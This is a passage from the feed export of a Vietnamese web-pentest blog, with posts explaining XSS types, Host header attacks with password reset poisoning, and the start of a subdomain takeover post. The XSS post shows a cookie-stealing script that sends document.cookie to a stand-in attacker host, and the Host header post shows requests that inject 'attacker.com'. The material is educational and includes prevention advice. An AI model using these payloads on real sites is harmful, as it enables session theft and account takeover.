sự hữu ích của tính  năng auto report của CSP - “report-only” cho các quản trị). OK cùng xem nào ! và hẹn các bạn ở bài viết sau.</p><div class="video-container"><iframe src="https://www.youtube.com/embed/mr230uotw-Y" frameborder="0" loading="lazy" allowfullscreen></iframe></div><h2>Tham khảo</h2><ul><li><a href="https://en.wikipedia.org/wiki/Content_Security_Policy">https://en.wikipedia.org/wiki/Content_Security_Policy</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a></li><li><a href="https://w3c.github.io/webappsec-csp/#framework">https://w3c.github.io/webappsec-csp/#framework</a><a href="https://www.netsparker.com/blog/web-security/content-security-policy/">https://www.netsparker.com/blog/web-security/content-security-policy/</a></li><li><a href="https://blog.sucuri.net/2018/04/content-security-policy.html">https://blog.sucuri.net/2018/04/content-security-policy.html</a></li><li><a href="https://content-security-policy.com/">https://content-security-policy.com/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt; **Content Security Policy(CSP) làgì?** &lt;/h2&gt;



&lt;p&gt;Content Security Policy (CSP) là chính sách bảo mật nội dung, được sử dụng để xác đị
      
    
    </summary>
    
    
      <category term="Technology" scheme="http://blog.hydrasky.ml/tags/Technology/"/>
    
  </entry>
  
  <entry>
    <title>Cross Site Scripting (Part 1)</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/Cross%20Site%20Scripting%20(Part1)/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/Cross Site Scripting (Part1)/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h4>Cross Site Scripting là gì ? Có những kiểu nào ?</h4><p>Cross Site Scripting (XSS) là một trong những kiểu tấn công hay là lỗ hổng phổ biến hiện nay đổi với web application .Nó không gọi tắt là CSS để tránh nhầm lẫn với khái niệm Cascading Style Sheet của HTML.</p><p>Kỹ thuật XSS được thực hiện dựa trên việc chèn các đoạn script độc hại vào trong source code ứng dụng web. Nhằm thực thi các đoạn mã độc Javascript để chiếm phiên làm việc (session) của người dùng. Từ đó cho phép kẻ tấn công giả danh thành người dùng , thực hiện bất kỳ chức năng nào mà người dùng có thể thực hiện và truy cập vào bất kỳ dữ liệu nào của người dùng mà không cần phải đăng nhập bằng tài khoản của nạn nhân. Nếu người dùng có quyền truy cập đặc quyền trong ứng dụng thì kẻ tấn công cũng có thể có toàn quyền kiểm soát tất cả các chức năng và dữ liệu của ứng dụng đó.</p><p>Một điều lưu ý bạn hiểu là tấn công XSS được thực hiện ở phía client không làm ảnh hưởng đến hệ thống trên server . Nó có thể được thực hiện với các ngôn ngữ lập trình phía client khác nhau. Tuy nhiên, thường xuyên nhất cuộc tấn công này được thực hiện với Javascript và HTML. </p><p>XSS có 3 kiểu nhưng đều có cách thức tấn công chung là kẻ tấn công sẽ cố gắng gửi cho nạn nhân link có chứa script độc hại hoặc nội dung có chứa script độc hại nhằm lừa người dùng thực thi nó . Sau khi thực thi thì session của người dùng sẽ được gửi đến hacker . Hacker đã có quyền truy cập, thay đổi thông tin tài khoản mà nạn nhân không hề hay biết.  </p><p>Đây là một ví dụ kẻ tấn công chèn script qua giá trị đầu vào (input param) thông qua URL :</p><img src="/images/XSS/xss1.png" class="[class names]" title="[500] [500] " alt="Xss trong chức năng tìm kiếm"><p>Inject qua các input param là cách thức đơn giản của việc kiểm thử lỗ hổng này, do mức độ bảo mật của các website ngày càng được nâng cao nên các biến thể của cách tấn công cũng đa dạng theo (Cụ thể như thế nào ở phần tiếp theo). Điều tiếp theo chúng ta  cần nhớ Cross Site Scripting (XSS) có 3 loại  chính là :</p><ul><li>Reflected XSS</li><li>Stored XSS</li><li>DOM based XSS (Biến thể của Reflected)</li></ul><h4>Reflected XSS</h4><p>Trong 3 loại thì Reflected XSS là loại tấn công phổ biến nhất. Rất nhiều tài liệu giới thiệu về nó nhưng lại nói chung chung khiến người đọc không hiểu được bản chât, chỉ hiểu đơn giản là inject payload và gửi cho người dùng thực thi trên trình duyệt và thế là xong. Bạn cần phải hiểu ý nghĩa của reflected ở đây để có thể phân biệt với lại một đồng bọn của nó là DOM BASE. Thế ta cần hiểu như thế nào , đơn giản thôi reflect là ánh xạ, trong khi DOMBASE là đường thẳng.</p><p>Như hình dưới đây, đầu tiên nạn nhân nhận được 1 request độc hại, nạn nhân kích vào nhưng payload chưa thể thực thi ở đây thay vào đó trình duyệt sẽ gửi request đó lên server. Server sẽ xử lí và trả về phẩn hồi có chứa payload. Lúc này trình duyệt sẽ xử lí response nó là thực thi payload. Việc payload được gửi cho người dùng rồi được chuyển sang server và phản hồi cho client gân giống với ánh xạ và nó gọi là relected xss.</p><figure class="wp-block-image"><img src="https://2.bp.blogspot.com/-Up9Gu_xOnLI/VSX6aqmSz0I/AAAAAAAAHWY/dIQi3ZY5JE4/s1600/3-17-2014-5-51-21-PM-700x398.jpg" alt=""/><figcaption>Các bước thực hiện tấn công Reflected XSS</figcaption></figure><p>Cách thức tấn công chủ yếu là gửi link có chứa script độc hại như sau:</p><p style="font-size:15.5px">http://example.com/<a href="https://ac541f041e348399802625d4008000fe.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E">name=<script>var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;</script></a><p>Khi người dùng click vào đường link , request sẽ được gửi lên server, sessionid được trả về phía client và script có trong thành phần (Element)  của website lúc này  và trình duyệt (Browser) sẽ thực thi script đó.Lúc này người dùng đang có phiên làm việc với ứng dụng (example.com), đoạn script sẽ gửi đến server của hacker (hacker-site.net) với giá trị  “document.cookie” - Sessionid. Dưới đây là hình ảnh minh họa các bước tấn công :<br> Một bài lab trên portswigger.net về reflected XSS:</p><figure class="wp-block-image size-large"><img src="http://hydrasky.000webhostapp.com//wp-content/uploads/2020/03/image-1024x384.png" alt="" class="wp-image-68"/><figcaption>Reflected Xss Lab on Portswigger</figcaption></figure><p>Trong hình trên, ta chèn script độc hại thông qua biến “search” và đoạn script vẫn nằm trong cặp tag “h1”.</blockquote></p><h4>DOM Based XSS</h4><p>Đầu tiên ta cần biết <a rel="noreferrer noopener" href="https://viblo.asia/p/nhung-khai-niem-co-ban-ve-dom-DzVkpoDgenW" target="_blank">DOM</a> là từ viết tắt của Document Object Model là 1 dạng chuẩn của W3C đưa ra nhằm để truy xuất và thao tác dữ liệu của tài liệu có cấu trúc như HTML, XML. Để javascript làm việc được với các thẻ HTML thì cần sử dụng đến DOM. Lấy một ví dụ như này: (W3school)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">body&gt;</span><br><span class="line">&lt;p&gt;Click the button to display the URL of the document.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;button onclick&#x3D;&quot;myFunction()&quot;&gt;Try it&lt;&#x2F;button&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;demo&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">  var x &#x3D; document.URL;</span><br><span class="line">  document.getElementById(&quot;demo&quot;).innerHTML &#x3D; x;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thao tác với dữ liệu của các DOM này, nó sử dụng dữ liệu của người dùng hay các dữ liệu ngoài như URL để thêm HTML vào trang như ví dụ trên. Về đặc điểm thì nó giống như reflected chỉ khác là payload sẽ không được sử lí bởi server mà nó sử lí bởi client , server sẽ phản hồi về cho người dụng nội dung của site truy cập (cả các mã js hoặc  file) nhưng không có mã độc hại (payload) nào trong response. Khi trình duyệt nhận phản hồi, chính các js hay DOM sẽ xử lí các tham số mà nó xác định được và thực thi payload. Server lúc này chỉ đóng vai trò cung cấp tài nguyên chứ không hề tác động gì vào quá trình tấn công. Như hình dưới đây</p><img src="/images/XSS/xss2.jpg" class="[class names]" title="[500] [500] " alt="DOM Base XSS"><p> Như ví dụ trên ta sẽ sử dụng URL chứa payload nhưng vẫn được coi hợp lệ như sau “<a href="http://www.example.com/userdashboard.html#">http://www.example.com/userdashboard.html#</a></p><script>SomeFunction(somevariable)</script>“ và kết quả sẽ là:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;Click the button to display the URL of the document.&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;button onclick&#x3D;&quot;myFunction()&quot;&gt;Try it&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">&lt;p id&#x3D;&quot;demo&quot;&gt;http:&#x2F;&#x2F;www.example.com&#x2F;userdashboard.html#&lt;&#x2F;p&gt;&lt;script&gt;SomeFunction(somevariable)&lt;&#x2F;script&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p> Vì vậy lỗ hổng này sẽ khai thác khó hơn các kiểu còn lại vì nó yêu cầu kẻ tấn công có nhiều kiến thức về javascript và html.</p><p>Tấn công DOM Based XSS thông thường không qua các giá trị đầu vào mà nó qua “HTML Manipulation sinks” như: InnerHTML, outerHTML,  …  và “Browser JavaScript execution sinks” như : eval sink, document sink , location sink … .</p><p>The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:<br>document.write() ,document.writeln(),  document.domain,  someDOMElement.innerHTML,  someDOMElement.outerHTML,  someDOMElement.insertAdjacentHTML,  someDOMElement.onevent</p><p> The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:<br>add() , after(),  append() , animate() , insertAfter()  ,insertBefore(),  before(),  html(),  prepend() , replaceAll(),  replaceWith(),  wrap() , wrapInner(),  wrapAll(),  has() , constructor(,)  init() , index(),  jQuery.parseHTML(),  $.parseHTML(),</p><p> Hầu hết nguyên nhân dẫn đến lỗ hổng do người lập trình đã không kiểm soát đầu vào lỏng lẻo khi dùng các đối tượng trên  và nó cũng có thể tồn tại trong các thư viện như Jquery hay các framework: angular,react, ….  có sẵn mà người phát triển không hay biết. </p><p>Một lưu ý khi kiểm tra lỗ hổng DOM Base XSS thì không nên dùng “ View page source” (Ctrl +U) để xem luồng xử lí javascript hoạt động bởi vì nó sẽ không thấy được sự thay đổi .Thay vào đó hãy sử dụng “Developer tool” (Ctrl+Shift+I) và search (Ctrl + F) để tìm kiểm. </p><h4>STORED XSS</h4><p>Khác với 2 loại tấn công trên, Stored XSS hướng đến nhiều nạn nhân hơn. Lỗi này xảy vẫn xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào nhưng giá trị lần này sẽ được lưu vào cơ sở dữ liệu (database , file hay những khu vực khác nhằm lưu trữ dữ liệu của ứng dụng web). Ví dụ như các form góp ý, các comment … trên các trang web. Với kỹ thuật Stored XSS , hacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.</p><p>Đầu tiên hacker sẽ thông qua các điểm đầu vào (form, input, textarea…) không được kiểm tra kỹ để chèn vào CSDL các đoạn mã nguy hiểm.Tiếp theo đó người dùng truy cập vào dữ liệu có chứa script độc hại của hacker dẫn đến script được thực thi. Mức độ phát hiện bị lừa khó hơn 2 kiểu trước bên cạnh đó phảm vi ảnh hưởng đôi khi  rất là cao. Đó là lí do nó còn được gọi là persistent XSS - liên tiếp.</p><figure class="wp-block-image"><img src="https://i0.wp.com/securitydaily.net/wp-content/uploads/2014/03/stored-xss-scenario1.png?fit=998%2C576&ssl=1" alt=""/><figcaption>Stored XSS</figcaption></figure><p>Ngoài 3 kiểu trên còn tồn tại một kiểu XSS, còn một khái niệm nữa được gọi là  <strong>SELF-XSS</strong> .</p><p> Self-XSS ám chỉ việc XSS không thể khai thác trực tiếp hay được lưu trữ lại như trong 3 cách trên. Ví dụ  hay gặp nhất đó chính là mục checkout trong các cửa shop online (Mk có kiếm dk 1 cái của bọn razer nhưng trong scope ko chấp nhận nên mình cx chẳng submit và sau đó 1 tháng 1 ông nào đó đăng poc giống hệt của mk trên youtube… Ko biết là nên sad hay haha đây ), .Để khai thác lúc này yêu cầu phải kết hợp cả kĩ nghệ xã hội (Soical Engineering) - hay hiểu đơn giản là lừa chính nạn nhân thiếu hiểu biết (VD: Lừa  sẽ được thanh toàn miễn phí khi làm theo) chèn script và thực thi ở những vị trí tồn tại  XSS. Tester thường nghĩ là lỗ hổng XSS có thể tồn tại nhưng không thể khai thác được nhưng trong một số Bug Bounty Program vẫn được tính và trao thưởng.</p><img src="/images/XSS/22.png" class="[class names]" title="[500] [500] " alt="https:&#x2F;&#x2F;hackerone.com&#x2F;reports&#x2F;755679"><p>Phần tiếp theo XXX sẽ giới thiệu các cách khai thác lỗ hổng này. </p><p>Link tham khảo :</p><ul><li><a href="https://tech.bizflycloud.vn/tong-quan-ve-dom-based-cross-site-scripting-dom-xss-20190424103508199.htm">https://tech.bizflycloud.vn/tong-quan-ve-dom-based-cross-site-scripting-dom-xss-20190424103508199.htm</a></li><li><a href="https://portswigger.net/web-security/cross-site-scripting">https://portswigger.net/web-security/cross-site-scripting</a></li><li></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4&gt;Cross Site Scripting là gì ? Có những kiểu nào ?&lt;/h4&gt;



&lt;p&gt;Cross Site Scripting (XSS) là một trong những kiểu tấn công hay là lỗ hổng p
      
    
    </summary>
    
    
      <category term="Pentest Web" scheme="http://blog.hydrasky.ml/tags/Pentest-Web/"/>
    
  </entry>
  
  <entry>
    <title>Host Header Attack</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/Host%20Header%20Attack/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/Host Header Attack/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<!-- wp:image {"align":"center","width":485,"height":266} --><div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQYlVnvXSiQcarEPtvEKnYSHVLvIvgVcvzuHwJmX4PDXY2QHco2&usqp=CAU" alt="HOST HEADER INJECTION ATTACK - Ram Kumar - Medium" width="485" height="266"/></figure></div><p>Xin chào các bạn! Mình lại quay trở lại với một lỗ hổng thuộc dạng HTTP header injection . Kiểu tấn công này thì nó không quá phức tạp vì mức ảnh hưởng của nó cũng chỉ ở mức bình thường. Nhưng như vậy không có nghĩ là mình sẽ bỏ qua, đôi khi có những cái mình không ngờ lại là cái nguy hiểm nhất. Vậy Host Header Attack có gì hay? Chúng ta cùng tìm hiểu nào?</p><p>A client MUST include a Host header field in all HTTP/1.1 request messages <strong>RFC 2616</strong> </p><p>Theo như trong tài liệu  <strong><a href="https://tools.ietf.org/html/rfc2616#page-128">RFC 2616</a></strong>  ở mục 14.23 thì trong tất cả các message HTTP/1.1 request từ Client đén Server bắt buộc phải bao gồm trường  “Host” header .Nếu URI được request đến không chứa tên máy chủ Internet của dịch vụ thì trường Host header coi như có giá trị là “empty”(rỗng) .Bất kỳ request HTTP/1.1 nào không có trường Host header  thì sẽ được máy chủ phản hồi với mã trạng thái là 400 (bad request). Thế “Host” header để làm gì ta?</p><p>Thông thường một máy chủ web thường phục vụ, lưu trữ nhiều website hoặc ứng dụng web và tất nhiên chúng sẽ cùng một địa chỉ IP của server. Mỗi website hay ứng dụng được lưu trữ như vậy được gọi là “Virtual host”.Bây giờ làm sao cho người dùng có thể truy cập vào các website khác nhau ? Đó là lí do của HOST header tồn tại. Tiêu đề này sẽ nằm trong HTTP request đến máy chủ và máy chủ sẽ sử dụng giá trị của header này để chuyển request đến website hoặc ứng dụng được chỉ định. </p><p>Điều gì xảy ra nếu chúng ta thay đổi giá trị của header là các host không xác định (evil.com) ? Hầu hết các máy chủ web thường chuyển các các host khồng xác định trong header vào đầu của danh sách “virtual host” của nó, Vì vậy các request tới server với host header không xác định như vậy vẫn được coi là hợp lệ.</p><img src="/images/HHT/image-9.png" class="[class names]" title="[500] [500] " alt="title text"><p>Ngoài ra ngoài việc sử dụng “Host” header , attacker còn có thể sử dụng “X-Forward-Host” (viết tắt là XFH) để inject. XFH được sủ dụng để chỉ định máy chủ được chỉ định (X-Forward-Host: cdn.example.com) chuyển tiếp giá trị của “Host” header đến máy chủ gốc.XFH thường được áp dụng trong trương hợp sử dụng proxy hoặc các CDN, trong tài liệu của <a href="https://tools.ietf.org/html/rfc7230#section-5.4" target="_blank" rel="noreferrer noopener">RFC 7230</a>, phần 5.4 có nói:</p><blockquote><p>When a proxy receives a request with an absolute-form of request-target, the proxy MUST ignore the received Host header field (if any) and instead replace it with the host information of the request-target.Ngoài ra bạn có thể tham khảo thêm về tài liệu của <a href="https://www.keycdn.com/support/x-forwarded-host" target="_blank" rel="noreferrer noopener">KeyCDN</a></p></blockquote><img src="/images/HHT/image-10.png" class="[class names]" title="[500] [500] " alt="title text"><p>Header này thường được sử dụng phổ biến trong các ứng dụng web PHP, .Một số kịch bản trong ví dụ sau đây là cách sử dụng tiêu biểu và nguy hiểm của host header:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;&lt;?php echo _SERVER[&#39;HOST&#39;] ?&gt;&#x2F;script.js&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Kẻ tấn công có thể lợi dụng code ở trên để tạo đầu ra HTML chỉ bằng cách thao túng host header.</p><pre><code>GET / HTTP/1.1Host: www.attacker.com[ X-Forwarded-Host: www.attacker.com ]</code></pre><p>Và kết quả nhận được là trình duyệt của victims sẽ load file .js từ máy chủ của attacker :</p><pre><code>&lt;script src=&quot;http://attacker.com/script.js&quot;&gt;</code></pre><p>Từ đây attacker có thể thực hiện một cuộc tấn công xss hoặc phising. Nhưng với kiểu này sẽ rất khó để khai thác ở ngoài thực tế. bạn chỉ có thể thay đổi được giá trị các header trong request của victim chỉ khi bạn có thể can thiệp vào giữa giao tiếp của Client vs Server như kiểu MITM (Man in the middle). Các bug bounty program thường không công nhận lỗi này vì vậy bỏ qua hướng đó và tiếp tục leo thang.</p><p>Sẽ có 2 hướng tấn công chính từ lỗ hổng HHA mình muốn đề cập là <a rel="noreferrer noopener" href="http://hydrasky.ml/2020/03/web-cache-poisoning-part-1" target="_blank">web cache poisoning</a> và Password reset poisoning.</p><h4>Đối với Web cache poisoning</h4><p>Để điều này xảy ra, kẻ tấn công sẽ cần phải đầu độc proxy cache của trang web hoặc nhà cung cấp được website sử dụng như các CDN.Cache sau đó sẽ phục vụ nội dung bị nhiễm độc cho bất kỳ ai request với nội dung tương tự, và tất nhiên nạn nhân không thể kiểm soát được nội dung độc hại mà cache cung cấp cho họ. Để hiểu rõ hơn về WCP các bạn có thểm tham khảo <a href="http://blog.hydrasky.ml/2020/03/web-cache-poisoning-part-1" target="_blank" rel="noreferrer noopener">bài viết</a> của mình.</p><div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://blog.cloudflare.com/content/images/2018/08/subtle-req-resp.png" alt="Ví dụ" width="458" height="307"/></figure></div><p>Một điều lưu ý ở đây là lên sử dụng X-Forwarded-Host thay vì Host header để poisoning bởi vì thông thường Host header nằm trong cache key và bình thường sẽ chẳng ai tự thay đổi giá trị host header của mình về host của attacker hoặc thành một payload độc hại cả.</p><h4>Đối với Password reset poisoning</h4><p>Thông thường khi bạn quên mật khẩu bạn sẽ chọn cách là reset lại nó và chức năng nay ai cũng có thể sử dụng. Server sẽ tiến hành gửi email với link reset mật khẩu có dạng:</p><p>example.com/reset-password?email=victim@gmail.com&amp;code=identify:token (identify:tokenthường được mã hóa) . </p><p>Mình sẽ không giải thích code như thế nào nha! Các bạn cử hiêu đơn giản lúc này server sử dụng $_SERVER[‘HOST’] để xác định host của link.</p><p> Attacker đã lợi dụng điều này dùng tên tài khoản như email, username … của victim để thực hiện. Trước khi request được gửi đi, attacker sẽ sửa giá trị của host header thành máy chủ của attacker .Server sẽ tiến hành gửi email với link reset mật khẩu có dạnglà attacker.com/reset-password?email=victim@gmail.com&amp;code=identify:token(identify:tokenthường ở dạng mã hóa, đôi khi là JWT).</p><p>Ok như vậy khi victim vào mail và click vào link reset mật khẩu sẽ request đến server của attacker. Attacker lúc này chỉ việc ngồi và xem log trên máy chủ sẽ lấy được link hay quan trọng hơn đó la token để đổi mật khẩu của victim.</p><img src="/images/HHT/password-reset-poisoning.svg" class="[class names]" title="[500] [500] " alt="Password reset poisoning"><p>Một lỗ hổng khá dễ để khai thác nhưng tác động lại rất lớn.Tham khảo thêm <a href="https://hackerone.com/reports/281575">https://hackerone.com/reports/281575</a></p><h3>Cách tìm kiếm lỗ hổng này</h3><p>Để phát hiện ra nó rât đơn giản bạn chỉ cần chặn bắt request bằng các công cụ như Burpsuite hoặc Zap và thay đổi giá trị của Host header hoặc thêm vào X-Forwarded-Host rồi theo dõi reponse trả về là biết. Hoặc các bạn có thể sử dụng các công cụ scan web tự động như Acunetix. </p><!-- wp:image {"align":"center","width":515,"height":253} --><div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://www.cloudace.in/wp-content/uploads/2020/01/acunetix.png" alt="Acunetix Web Vulnerability Scanning Software - CloudACE Technologies" width="515" height="253"/></figure></div><h3>Các phòng chống lỗ hổng</h3><p>Thay vì sử dụng host header để xác định thì lập trình viên nên sử dụng SERVER_NAME.Bởi vì SERVER_NAME sẽ lấy thông tin từ cấu hình của máy chủ nên nó sẽ xác thực hơn. Cùng với đó bạn có thể kết hợp với việc sử dụng Whitelist cho các tên server được phép</p><!-- wp:preformatted --><pre class="wp-block-preformatted">$domains = [‘abc.example.com’, ‘foo.bar.com’]; if ( ! in_array($_SERVER[‘SERVER_NAME’], $domains)) { // error }</pre><!-- /wp:preformatted --><p>OK như vậy là mình đã nó xong về Host header attack, nói chung thì lỗ hổng này không có gì quá nổi bật nhưng cũng đáng để chúng ta học hỏi thêm kinh nghiệm. Xin chào và hẹn gặp các bạn vào bài viết sau!</p><h2>Tham khảo</h2><ul><li><a href="https://www.yeahhub.com/host-header-attack-practical-exploitation-and-prevention/">https://www.yeahhub.com/host-header-attack-practical-exploitation-and-prevention/</a></li><li><a href="https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html">https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</a></li><li><a href="https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/">https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- wp:image {&quot;align&quot;:&quot;center&quot;,&quot;width&quot;:485,&quot;height&quot;:266} --&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;figure class=&quot;aligncenter is-resized&quot;&gt;&lt;img src=&quot;h
      
    
    </summary>
    
    
      <category term="Pentest Web" scheme="http://blog.hydrasky.ml/tags/Pentest-Web/"/>
    
  </entry>
  
  <entry>
    <title>SQLi TIP</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/SQLi%20TIP/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/SQLi TIP/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Bug bounty Tip/Trick</p><p><strong>SQL Injection</strong></p><img src="/images/BugBountyTip/sqlinmail1.jpeg" class="[class names]" title="[500] [500] " alt="title text">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Bug bounty Tip/Trick&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SQL Injection&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;/images/BugBountyTip/sqlinmail1.jpeg&quot; class=&quot;[class names]&quot; titl
      
    
    </summary>
    
    
      <category term="BugBoutyTip" scheme="http://blog.hydrasky.ml/tags/BugBoutyTip/"/>
    
  </entry>
  
  <entry>
    <title>SCSP TIP</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/SCSP/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/SCSP/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Source: <strong>Seasoned Cyber Security Professionals</strong></p><img src="/images/SCSP/SCSP.png" class="[class names]" title="[500] [500] " alt="title text"><img src="/images/SCSP/SCSP1.png" class="[class names]" title="[500] [500] " alt="title text"><img src="/images/SCSP/SCSP2.png" class="[class names]" title="[500] [500] " alt="title text">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Source: &lt;strong&gt;Seasoned Cyber Security Professionals&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;/images/SCSP/SCSP.png&quot; class=&quot;[class names]&quot; title=&quot;[500] [5
      
    
    </summary>
    
    
      <category term="BugBoutyTip" scheme="http://blog.hydrasky.ml/tags/BugBoutyTip/"/>
    
  </entry>
  
  <entry>
    <title>Subdomain Takeover</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/SUBDOMAIN%20TAKEOVER/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/SUBDOMAIN TAKEOVER/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Subdomain takeover được công bố vào năm 2014 là một kiểu tấn công vào tên miền phụ (Subdomain) của  một website và nguyên nhân dẫn đến là do việc cấu hình DNS . Bằng cách này hacker có thể chiếm được full quyền kiểm soát của một subdomain từ đó thực hiện các cuộc tấn công giả mạo trang web (phishing) hoặc phát tán mã độc (malwares).</p><p>Như các bạn đã biết ** ** Domain ** ** name là tên đại diện của một website hoạt động trên internet, đóng vai trò là một địa chỉ vật lý thay vì dùng địa chỉ ip (lí do tại sao chắc các bạn đều rõ ) . Còn Subdomain <strong>** là phần mở rộng của một tên miền.Subdomain **</strong> có thể được tạo hoàn toàn miễn phí và nó có thể hoạt động như một tên miền thực thụ.Subdomainra đời nhằm giải quyết về chi phí đăng ký tên miền cũng như giúp bạn tạo ra nhiều website trên các lĩnh vực khác nhau thuộc tên miền chính. Ví dụ :</p><p>Domain: example.comSubdomain : hello.example.comDomain vs Subdomain</p><p>Gỉa sử bạn ở hữu một domain example.com và server của bạn có ip là 1.2.3.4 . Bây giờ bạn muốn trỏ domain về địa chỉ ip của server , nhà cung cấp tên miền (DNS provider) sẽ có cách giúp bạn làm điều này. Nhà cung cấp sẽ cung cấp trình quản lý tên miền để bạn có thể thêm, sửa ,trỏ tên miền về địa chỉ bạn muốn.</p><img src="/images/Sub/image-2.png" class="[class names]" title="[500] [500] " alt="Quản lí domain"><p>Trong phần cấu hình sẽ có mục bản ghi cho tên miền “record” dùng để dùng để mô tả các thông tin về cơ sở dữ liệu DNS, bạn có thể tham khảo <a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types" target="_blank" rel="noreferrer noopener" aria-label="DNS_Record (opens in a new tab)">DNS_Record</a> . Đối với vấn đề này ta chỉ biết đến các bản ghi sau:</p><ul><li>Bản ghi A hoặc AAAA</li><li>Bản ghi CNAME</li><li>Bản ghi bổ sung như ALIAS và URL </li></ul><p>Bản ghi A vs AAAA: Đây là các bản ghi thường được dùng, dùng để trỏ một domain hoặc subdomain về một host hay ip tương ứng.</p><p>Bản ghi CNAME : hay còn gọi là Bản ghi bí danh dành cho các tên miền phụ . Bản ghi CNAME cho phép một server có thể có nhiều tên. Nói cách khác bản ghi CNAME cho phép nhiều tên miền cùng trỏ đến một địa chỉ IP cho trước hoặc liên kết tới một bản ghi khác .Ví dụ : “hello.example.com hi.demo.com CNAME”</p><p>Bản ghi bổ sung như ALIAS và URL : Đây là những bản ghi không có trong<a href="https://www.ietf.org/rfc/rfc1035.txt">DNS RFC</a>, vì vậy chúng chỉ được hỗ trợ bởi một số nhà cung cấp DNS nhất định.ALIASlà một bản ghi giả hoạt động như mộtCNAMEnhưng có thể được sử dụng cho cả tên miền gốc và tên miền phụ.Bảnghi chuyển hướng URLđược sử dụng để chuyển hướng một tên miền sang một tên miền / URL khác.</p><h4>SECOND-ORDER SUBDOMAIN TAKEOVERS</h4><p>Quay trở lại vấn đề, việc hacker cơ tiếp quản subdomain là do cấu hình DNS. Thông thường các dịch vụ bên thứ 3 như Desk, Squarespace, Shopify, Github, Tumblr, và Heroku … khi người dùng đăng kí lấy ứng dụng, tài khoản thì sẽ được cấp một subdomain đi kèm để truy cập trực tiếp vào nội dung của mình như sau :</p><img src="/images/Sub/image-3.png" class="[class names]" title="[500] [500] " alt="Quản lí domain"><p>Tuy nhiên mọi người thường muốn dùng tên miền của riêng mình thay vì tên miền của Provider cấp cho. Đơn giản họ chỉ cần cấu hình DNS trỏ tên miền của họ về tiên miền được cung cấp bởi bên thứ 3 : “shop.example.com”</p><img src="/images/Sub/image-4.png" class="[class names]" title="[500] [500] " alt="Quản lí domain"><p>Và vấn đề ở đây xảy ra khi các subdomain do bên thứ 3 cung cấp đã hêt hạn đăng kí sẽ có hai trường hợp xảy ra là người dùng không muốn dùng 